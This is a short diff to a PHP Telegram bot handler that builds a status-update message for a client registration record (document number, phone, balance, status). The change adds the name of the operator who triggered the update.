@@ -51,13 +51,18 @@ try {
     ];
     $label = $emojis[$nuevoEstado] ?? $nuevoEstado;
 
+    $from = $callback['from'] ?? [];
+    $operador = !empty($from['username']) ? '@' . $from['username'] : trim(($from['first_name'] ?? '') . ' ' . ($from['last_name'] ?? ''));
+    if (empty($operador)) $operador = 'Operador';
+
     if ($c && $messageId) {
         $texto = "🔔 *Registro #{$clienteId}* — *{$label}*\n\n"
                . "📋 *Tipo doc:* {$c['tipo_documento']}\n"
                . "🪪 *Documento:* {$c['num_documento']}\n"
                . "📱 *Celular:* {$c['num_celular']}\n"
                . "💰 *Saldo:* {$c['saldo_cuenta']}\n"
-               . "📊 *Estado:* {$label}";
+               . "📊 *Estado:* {$label}\n"
+               . "👤 *Operador:* {$operador}";
 
         $postData = [
             'chat_id' => $chatId,
